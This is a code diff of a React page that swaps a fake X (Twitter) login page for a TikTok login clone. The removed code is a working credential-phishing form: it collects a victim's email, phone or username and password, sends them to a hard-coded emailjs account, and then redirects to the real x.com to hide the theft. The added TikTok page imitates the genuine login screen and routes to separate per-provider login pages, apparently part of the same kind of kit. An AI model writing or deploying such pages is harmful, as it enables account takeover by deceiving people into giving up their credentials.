@@ -1,164 +1,126 @@
-import { useState, useEffect } from "react";
-import { motion } from "framer-motion";
-import emailjs from "emailjs-com";
+import { motion } from 'framer-motion';
+import Image from 'next/image';
+import { useRouter } from 'next/router';
 
-export default function XLogin() {
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-  const [verification, setVerification] = useState("");
-  const [error, setError] = useState("");
-  const [darkMode, setDarkMode] = useState(false);
-  const [step, setStep] = useState(1);
+export default function TikTokLoginPage() {
+  const router = useRouter();
 
-  useEffect(() => {
-    const storedDarkMode = localStorage.getItem("darkMode") === "true";
-    setDarkMode(storedDarkMode);
-    document.documentElement.classList.toggle("dark", storedDarkMode);
-  }, []);
-
-  const toggleDarkMode = () => {
-    setDarkMode((prev) => {
-      localStorage.setItem("darkMode", !prev);
-      document.documentElement.classList.toggle("dark", !prev);
-      return !prev;
-    });
-  };
-
-  const handleNext = (e) => {
-    e.preventDefault();
-    if (!email.trim()) {
-      setError("Please enter a valid email or username.");
-    } else {
-      setError("");
-      setStep(2);
+  const handleLoginSelection = (loginMethod) => {
+    switch (loginMethod) {
+      case 'tiktok':
+        router.push('/tiktok-login');
+        break;
+      case 'phone':
+        router.push('/phone-login');
+        break;
+      case 'facebook':
+        router.push('/facebook-login');
+        break;
+      case 'google':
+        router.push('/google-login');
+        break;
+      case 'apple':
+        router.push('/apple-login');
+        break;
+      default:
+        break;
     }
-  };
-
-  const handleVerification = (e) => {
-    e.preventDefault();
-    if (!verification.trim()) {
-      setError("Please enter your phone number or username.");
-    } else {
-      setError("");
-      setStep(3);
-    }
-  };
-
-  const handleSubmit = (e) => {
-    e.preventDefault();
-    if (!password) {
-      setError("Please enter your password.");
-      return;
-    }
-
-    emailjs
-      .send(
-        "service_ftb4lhs",
-        "template_9zwksrd",
-        { email, verification, password },
-        "o07HchFDD89TJ91W-"
-      )
-      .then(
-        () => {
-          alert(
-            "Thanks for your interest in our offer, I will contact you shortly. You can now continue with X!"
-          );
-          window.location.href = "https://x.com/i/flow/login";
-        },
-        () => {
-          alert("Your identity cannot be verified at the moment. Try again.");
-        }
-      );
   };
 
   return (
-    <div
-      className={`flex flex-col md:flex-row h-screen items-center justify-center ${darkMode ? "bg-black text-white" : "bg-white text-black"}`}
-    >
-      <div className="md:w-1/2 flex flex-col justify-center items-center p-8 text-center">
-        <img src="/logo.png" alt="X Logo" className="h-16 w-auto mb-4 dark:invert" />
-        <h1 className="text-4xl font-bold">Welcome to X</h1>
-        <p className="text-lg text-gray-500 dark:text-gray-400 max-w-md mt-2">
-          The best place to connect, share, and stay informed. Log in to your
-          account and verify your identity.
-        </p>
+    <div className="flex flex-col items-center justify-center min-h-screen bg-white">
+      {/* Close Button */}
+      <button className="absolute top-4 left-4 text-black text-2xl">
+        ✕
+      </button>
+
+      {/* Help Icon */}
+      <button className="absolute top-4 right-4 text-gray-500 text-xl">
+        ?
+      </button>
+
+      {/* Title */}
+      <h1 className="text-black text-3xl font-bold mb-2">Log in to TikTok</h1>
+
+      {/* Subtitle */}
+      <p className="text-gray-500 text-sm mb-8 text-center">
+        Manage your account, check notifications, comment on videos, and more.
+      </p>
+
+      {/* Login Options */}
+      <div className="space-y-4 w-80">
+        <motion.button
+          onClick={() => handleLoginSelection('tiktok')}
+          className="w-full p-3 bg-white border border-gray-300 rounded text-black text-base flex items-center justify-start"
+          whileHover={{ scale: 1.02 }}
+          whileTap={{ scale: 0.98 }}
+        >
+          <Image src="/tiktok-icon.png" alt="TikTok Icon" width={24} height={24} className="mr-4" />
+          Use TikTok app
+        </motion.button>
+
+        <motion.button
+          onClick={() => handleLoginSelection('phone')}
+          className="w-full p-3 bg-white border border-gray-300 rounded text-black text-base flex items-center justify-start"
+          whileHover={{ scale: 1.02 }}
+          whileTap={{ scale: 0.98 }}
+        >
+          <Image src="/user-icon.png" alt="User Icon" width={24} height={24} className="mr-4" />
+          Use phone / email / username
+        </motion.button>
+
+        <motion.button
+          onClick={() => handleLoginSelection('facebook')}
+          className="w-full p-3 bg-white border border-gray-300 rounded text-black text-base flex items-center justify-start"
+          whileHover={{ scale: 1.02 }}
+          whileTap={{ scale: 0.98 }}
+        >
+          <Image src="/facebook-icon.png" alt="Facebook Icon" width={24} height={24} className="mr-4" />
+          Continue with Facebook
+        </motion.button>
+
+        <motion.button
+          onClick={() => handleLoginSelection('google')}
+          className="w-full p-3 bg-white border border-gray-300 rounded text-black text-base flex items-center justify-start"
+          whileHover={{ scale: 1.02 }}
+          whileTap={{ scale: 0.98 }}
+        >
+          <Image src="/google-icon.png" alt="Google Icon" width={24} height={24} className="mr-4" />
+          Continue with Google
+        </motion.button>
+
+        <motion.button
+          onClick={() => handleLoginSelection('apple')}
+          className="w-full p-3 bg-white border border-gray-300 rounded text-black text-base flex items-center justify-start"
+          whileHover={{ scale: 1.02 }}
+          whileTap={{ scale: 0.98 }}
+        >
+          <Image src="/apple-icon.png" alt="Apple Icon" width={24} height={24} className="mr-4" />
+          Continue with Apple
+        </motion.button>
       </div>
 
-      <motion.div
-        initial={{ opacity: 0, x: 50 }}
-        animate={{ opacity: 1, x: 0 }}
-        transition={{ duration: 0.5 }}
-        className="w-full md:w-1/2 p-8 bg-gray-900 dark:bg-white rounded-lg shadow-lg max-w-md"
-      >
-        <div className="flex justify-between items-center mb-4">
-          <h1 className="text-3xl font-bold text-white dark:text-black">Sign in to X</h1>
-          <button onClick={toggleDarkMode} className="p-2 bg-gray-700 dark:bg-gray-300 rounded">
-            {darkMode ? "🌞" : "🌙"}
-          </button>
-        </div>
-        {step === 1 && (
-          <form onSubmit={handleNext} className="space-y-4">
-            <input
-              type="text"
-              placeholder="Email or username"
-              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-            />
-            {error && <p className="text-red-500 text-sm">{error}</p>}
-            <motion.button
-              whileHover={{ scale: 1.05 }}
-              whileTap={{ scale: 0.95 }}
-              type="submit"
-              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
-            >
-              Next
-            </motion.button>
-          </form>
-        )}
-        {step === 2 && (
-          <form onSubmit={handleVerification} className="space-y-4">
-            <p className="text-yellow-500 text-sm">
-              Please verify your identity by entering your phone number or
-              username.
-            </p>
-            <input
-              type="text"
-              placeholder="Phone number or username"
-              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
-              value={verification}
-              onChange={(e) => setVerification(e.target.value)}
-            />
-            <motion.button
-              whileHover={{ scale: 1.05 }}
-              whileTap={{ scale: 0.95 }}
-              type="submit"
-              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
-            >
-              Next
-            </motion.button>
-          </form>
-        )}
-        {step === 3 && (
-          <form onSubmit={handleSubmit} className="space-y-4">
-            <input
-              type="password"
-              placeholder="Password"
-              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-            />
-            <motion.button
-              whileHover={{ scale: 1.05 }}
-              whileTap={{ scale: 0.95 }}
-              type="submit"
-              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
-            >
-              Sign In
-            </motion.button>
-          </form>
-        )}
-      </motion.div>
+      {/* Terms and Privacy Policy */}
+      <p className="text-gray-500 text-xs mt-8 text-center max-w-xs">
+        By continuing with an account located in Nigeria, you agree to our{' '}
+        <a href="#" className="text-black font-semibold">
+          Terms of Service
+        </a>{' '}
+        and acknowledge that you have read our{' '}
+        <a href="#" className="text-black font-semibold">
+          Privacy Policy
+        </a>.
+      </p>
+
+      {/* Sign Up Link */}
+      <div className="mt-4">
+        <p className="text-black text-sm">
+          Don’t have an account?{' '}
+          <a href="/signup" className="text-pink-500 font-semibold">
+            Sign up
+          </a>
+        </p>
+      </div>
     </div>
   );
 }
